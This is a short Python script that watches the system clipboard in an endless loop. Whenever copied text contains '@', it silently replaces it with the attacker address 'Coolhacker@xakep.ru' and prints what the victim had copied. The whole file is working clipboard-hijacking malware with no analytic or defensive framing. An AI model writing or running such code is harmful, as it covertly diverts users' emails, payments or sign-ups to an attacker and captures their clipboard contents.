import pyperclip
import time

old = ''
while True:
    s = pyperclip.paste()
    if '@' in s:
        pyperclip.copy('Coolhacker@xakep.ru')
        print(s)
        old = s
    elif (s != old):
        print(s)
        old = s
        time.sleep(1)